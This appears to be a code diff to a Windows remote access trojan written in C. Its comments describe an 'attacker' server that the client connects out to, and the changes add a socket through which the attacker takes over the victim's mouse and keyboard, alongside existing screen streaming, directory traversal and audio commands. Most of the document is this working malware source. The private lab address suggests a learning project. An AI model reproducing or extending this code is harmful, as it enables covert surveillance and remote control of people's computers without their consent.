@@ -1,4 +1,5 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this
+#define WINVER 0x0500 // required to use SendInput() function
 
 #include <winsock2.h> // windows socket header
 #include <shlwapi.h> // useful functions for directory traversal
@@ -14,6 +15,7 @@
 #define CMD_SERVER_ADDR "192.168.56.1"
 #define CMD_SERVER_PORT 8080
 #define VIDEO_PORT 8081
+#define INPUT_PORT 8082
 
 // change directory and list directory contents
 #define CHANGE_DIR 1
@@ -38,16 +40,33 @@
 #define PRINT_INFO 15
 // inform the attacker what the current directory is
 #define NEW_CURR_DIR 16
+// constants for controlling the mouseand keyboard
+#define MOUSE_POS 17 /* this will be followed by X, Y coords for the mouse */
+#define MOUSE_DOWN 18 /* this will be followed by MOUSE_LEFT, MOUSE_RIGHT, or MOUSE_MIDDLE */
+#define MOUSE_UP 19 /* same as MOUSE_DOWN */
+#define MOUSE_LEFT 20
+#define MOUSE_RIGHT 21
+#define MOUSE_MIDDLE 22
+#define MOUSE_WHEEL 23 /* this will be followed by a number to specify the scroll amount */
+#define KEY_DOWN 24 /* this will be followed by a Windows virtual-key code */
+#define KEY_UP 25 /* same as KEY_DOWN */
+#define START_INPUT 26 /* tell the C client to simulate inputs from a list of all input events since last frame */
+#define CONT_INPUT 27 /* tell the C client there's more input - ends with null terminator */
 
 // define useful globals
 char currDir[MAX_PATH]; // name of the current directory
 SOCKET mainSock; // main socket used to receive commands and send info
 SOCKET videoSock; // socket used to send video data to attacker server
+SOCKET inputSock; // socket used to receive keyboard/mouse input from attacker
 int videoOn = 0; // boolean for whether the video stream is running
 HANDLE videoThread; // handle for thread that sends video to attacker
+HANDLE inputThread; // handle for thread that gets input stream from attacker
+int mouseControl = 0; // flag for if mouse is being controlled
+int keyboardControl = 0; // flag for if keyboard is being controlled
 
 DWORD WINAPI test(void* data);
 void connectToVideo();
+void connectToInput();
 
 // helper function for exiting on error
 void exitOnError() {
@@ -162,6 +181,197 @@ void listDirectoryContents() {
 }
 
 /*
+* Helper function to check if KEYEVENTF_EXTENDEDKEY needs to be set for a given virtual-key code 
+* The following is pulled from the MSDN documentation:
+* 
+* The extended-key flag indicates whether the keystroke message originated from one of the 
+* additional keys on the enhanced keyboard. The extended keys consist of the ALT and
+* CTRL keys on the right-hand side of the keyboard; the INS, DEL, HOME, END, PAGE UP, PAGE DOWN,
+* and arrow keys in the clusters to the left of the numeric keypad; the NUM LOCK key; 
+* the BREAK (CTRL+PAUSE) key; the PRINT SCRN key; and the divide (/) and 
+* ENTER keys in the numeric keypad. The extended-key flag is set if the key is an extended key.
+*/
+DWORD isExtendedKey (WORD code) {
+	switch(code)
+	{
+		// from stackoverflow: VK_UP, VK_DOWN, VK_LEFT, VK_RIGHT, VK_HOME, VK_END, VK_PRIOR, VK_NEXT, VK_INSERT, VK_DELETE
+		case VK_RMENU:
+		case VK_RCONTROL:
+		case VK_INSERT:
+		case VK_DELETE:
+		case VK_HOME:
+		case VK_END:
+		case VK_PRIOR:
+		case VK_NEXT:
+		case VK_LEFT:
+		case VK_RIGHT:
+		case VK_UP:
+		case VK_DOWN:
+			return KEYEVENTF_EXTENDEDKEY;
+		default:
+			return 0;
+	}
+}
+
+/*
+* Process input stream sent from command server
+* Send inputs to OS if keyboard and/or mouse control is enabled
+*/
+void processInputStream(char* buffer) {
+	// locals used for processing stuff
+	int idx = 0;
+	int prev = 0; // used for debug with infinite loops
+	char cmd;
+	// main loop - this always passes the first time
+	do {
+		prev = idx;
+		cmd = buffer[idx + 1];
+		printf("Processing cmd: %d\n", cmd);
+		printf("Key and mouse control: %d, %d\n", keyboardControl, mouseControl);
+		if (mouseControl == 1) {
+			// assume we will be sending a mouse input cand create the INPUT structure
+			// this shouldn't be that big of a time waste if we don't send an input
+			INPUT in;
+			in.type = INPUT_MOUSE;
+			// could change to keep X and Y constant between each MOUSE_POS event
+			in.mi.dx = 0;
+			in.mi.dy = 0;
+			in.mi.mouseData = 0;
+			in.mi.time = 0;
+			in.mi.dwExtraInfo = 0;
+			if (cmd == MOUSE_DOWN) { // mouse click
+				printf("mouse down\n");
+				char button = buffer[idx + 2];
+				if (button == MOUSE_LEFT) {
+					in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
+				} else if (button == MOUSE_MIDDLE) {
+					in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
+				} else if (button == MOUSE_RIGHT) {
+					in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
+				}
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting mouse down into input stream: %d\n", GetLastError());
+				}
+				idx += 3;
+			} else if (cmd == MOUSE_UP) { // mouse release
+				printf("mouse up\n");
+				char button = buffer[idx + 2];
+				if (button == MOUSE_LEFT) {
+					in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
+				}
+				else if (button == MOUSE_MIDDLE) {
+					in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
+				}
+				else if (button == MOUSE_RIGHT) {
+					in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
+				}
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting mouse up into input stream: %d\n", GetLastError());
+				}
+				idx += 3;
+			} else if (cmd == MOUSE_WHEEL) { // mouse wheel scrolled
+				printf("mouse wheel\n");
+				in.mi.dwFlags = MOUSEEVENTF_WHEEL;
+				char amount = buffer[idx + 2];
+				if(amount == 0) { // was it a negative scroll amount?
+					in.mi.mouseData = buffer[idx + 3] * -1;
+					idx += 4;
+				} else {
+					in.mi.mouseData = amount;
+					idx += 3;
+				}
+				in.mi.mouseData *= 120; // MOUSE_DELTA = 120
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting mouse wheel into input stream: %d\n", GetLastError());
+				}
+			} else if (cmd == MOUSE_POS) { // mouse move event
+				printf("mouse pos\n");
+				in.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
+				int * ref = &buffer[idx + 2];
+				in.mi.dx = ntohl(ref[0]);
+				in.mi.dy = ntohl(ref[1]);
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting mouse move into input stream: %d\n", GetLastError());
+				}
+				idx += 10;
+			}
+		}
+		if (keyboardControl == 1) {
+			// assume we will be sending a key input and create the INPUT structure
+			// this shouldn't be that big of a time waste if we don't send an input
+			INPUT in; // INPUT structure to send
+			in.type = INPUT_KEYBOARD; // this is a keyboard input
+			in.ki.wScan = 0; // not using the scan code
+			in.ki.time = 0; // let the system generate a timestamp
+			in.ki.dwExtraInfo = 0; // no extra info to send
+			in.ki.wVk = buffer[idx + 2]; // set the virtual key-code to what we received
+			DWORD extendedFlag = isExtendedKey(in.ki.wVk);
+			// check if we're sending an input, and whether that input is a key press or key release
+			if (cmd == KEY_DOWN) {
+				printf("Pressing %x\n", (unsigned char)buffer[idx + 2]);
+				in.ki.dwFlags = extendedFlag; // no flags (0) for key press
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting key press into input stream: %d\n", GetLastError()); }
+				idx += 3;
+			} else if (cmd == KEY_UP) {
+				printf("Releasing %x\n", (unsigned char)buffer[idx + 2]);
+				in.ki.dwFlags = KEYEVENTF_KEYUP | extendedFlag; // KEYEVENTF_KEYUP for key release
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting key release into input stream: %d\n", GetLastError()); }
+				idx += 3;
+			}
+		}
+		//printf("Buffer[%d] = %d\n", idx, buffer[idx]);
+	} while(buffer[idx] == CONT_INPUT && prev != idx);
+	// DEBUG
+	/*
+	if (prev == idx) {
+		printf("Broke out of infinite loop!\n");
+	}
+	printf("Processed buffer + 10:");
+	for (int i=0; i<idx + 10; i++) {
+		printf(" %x", (unsigned char)buffer[i]);
+		if (i == idx) {
+			printf(" |");
+		}
+	}
+	printf("\n");
+	*/
+}
+
+/*
+* Get buffer for input control
+*/
+DWORD WINAPI inputLoop(void* data) {
+	// local vars
+	char buffer[4096];
+	int retCode;
+	// get and process commands from the attacker
+	while(mouseControl == 1 || keyboardControl == 1) {
+		// get the next command and check for errors or a closed connection
+		ZeroMemory(buffer, 4096);
+		retCode = recv(inputSock, buffer, 4096, 0);
+		if (retCode == 0) {
+			printf("Connection closed...\nStopping input loop...\n");
+			mouseControl = 0;
+			keyboardControl = 0;
+		}
+		else if (retCode < 0) {
+			printf("Input recv failed with error: %d\n", WSAGetLastError());
+			mouseControl = 0;
+			keyboardControl = 0;
+		}
+		// if we got this far, we have a valid message to process
+		processInputStream(buffer);
+	}
+	// close the socket
+	if (closesocket(inputSock) == SOCKET_ERROR) {
+		printf("Error closing input sock: %d\n", WSAGetLastError());
+	}
+	return 0;
+}
+
+/*
 * Handle commands from the attacker server
 * Return the #DEFINE associated with the command
 */
@@ -220,12 +430,29 @@ char handleCommand(char* buffer) {
 	} else if (cmd == END_VIDEO) {
 		videoOn = 0;
 	} else if (cmd == START_MOUSE) {
-		printf("Taking control of mouse...\n");
+		printf("Mouse is being controlled\n");
+		mouseControl = 1;
+		if (inputThread != NULL) {
+			DWORD ret;
+			if (!GetExitCodeThread(inputThread, &ret)) {
+				printf("Error checking input thread's state: %d\n", GetLastError());
+				return;
+			}
+			if (ret != STILL_ACTIVE) {
+				connectToInput();
+				inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
+			}
+		} else {
+			connectToInput();
+			inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
+		}
 		// get the port to connect to
-		int port = (buffer[1] * 256) + buffer[2];
-		printf("Attacker is controlling mouse from port %d\n", port);
+		//int port = (buffer[1] * 256) + buffer[2];
+		//printf("Attacker is controlling mouse from port %d\n", port);
 		//controlMouse(port);
 	} else if (cmd == END_MOUSE) {
+		printf("Mouse has been released\n");
+		mouseControl = 0;
 		// TODO - determine how best to stop mouse control
 	} else if (cmd == START_AUDIO) {
 		printf("Starting audio stream...\n");
@@ -236,15 +463,34 @@ char handleCommand(char* buffer) {
 	} else if (cmd == END_AUDIO) {
 		// TODO - determine how best to stop audio stream
 	} else if (cmd == START_KEYS) {
-		printf("Taking control of keyboard...\n");
+		printf("Keyboard is being controlled\n");
+		keyboardControl = 1;
+		if (inputThread != NULL) {
+			DWORD ret;
+			if (!GetExitCodeThread(inputThread, &ret)) {
+				printf("Error checking input thread's state: %d\n", GetLastError());
+				return;
+			}
+			if (ret != STILL_ACTIVE) {
+				connectToInput();
+				inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
+			}
+		} else {
+			connectToInput();
+			inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
+		}
 		// get the port to connect to
-		int port = (buffer[1] * 256) + buffer[2];
-		printf("Attacker is controlling keyboard from port %d\n", port);
+		//int port = (buffer[1] * 256) + buffer[2];
+		//printf("Attacker is controlling keyboard from port %d\n", port);
 		//controlKeyboard(port);
 	} else if (cmd == END_KEYS) {
 		// TODO - determine how best to stop keyboard control
+		printf("Keyboard has been released\n");
+		keyboardControl = 0;
 	} else if (cmd == KILL_PROC) {
 		printf("Ending process...\n");
+	} else if (cmd == START_INPUT) {
+		processInputStream(buffer);
 	} else {
 		printf("Unknown command received: %d\n", cmd);
 	}
@@ -285,6 +531,7 @@ void connectToCommandServer() {
 	// get and process commands from the attacker
 	do {
 		// get the next command and check for errors or a closed connection
+		ZeroMemory(buffer, 4096);
 		retCode = recv(mainSock, buffer, 4096, 0);
 		if (retCode == 0) {
 			printf("Connection closed...\nExiting program...\n");
@@ -325,6 +572,35 @@ void connectToVideo() {
 	}
 	else {
 		printf("Connected to video server\n");
+	}
+}
+
+/*
+* Connect to the input stream
+*/
+void connectToInput() {
+	struct sockaddr_in server;
+	printf("Connecting to input server\n");
+
+	// create the TCP socket
+	inputSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (inputSock == INVALID_SOCKET) {
+		printf("Could not create input socket: %d\n", WSAGetLastError());
+		return;
+	}
+
+	// set the server info structure
+	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
+	server.sin_family = AF_INET;
+	server.sin_port = htons(INPUT_PORT);
+
+	// connect to the attacker command server
+	if (connect(inputSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
+		printf("Could not connect to input server! Error code: %d\n", WSAGetLastError());
+		return;
+	}
+	else {
+		printf("Connected to input server\n");
 	}
 }
 
@@ -434,9 +710,9 @@ void videoStreamTest() {
 
 	// send frame info (width, height, size) before frame data
 	int buff[3];
-	buff[0] = width;
-	buff[1] = height;
-	buff[2] = fileSize;
+	buff[0] = htonl(width);
+	buff[1] = htonl(height);
+	buff[2] = htonl(fileSize);
 	retCode = send(videoSock, buff, 12, 0);
 	if (retCode == SOCKET_ERROR) {
 		printf("Could not send data: %d\n", WSAGetLastError());
@@ -444,7 +720,7 @@ void videoStreamTest() {
 	}
 
 	// print the size of the bitmap for the current frame - used for debug
-	printf("Frame %d x & y: %d x %d\n", frames++, width, height);
+	//printf("Frame %d x & y: %d x %d\n", frames++, width, height);
 
 	// vertically flip the image - just something with how the screen capture works
 	for (int row = 0; row < height; row++) {
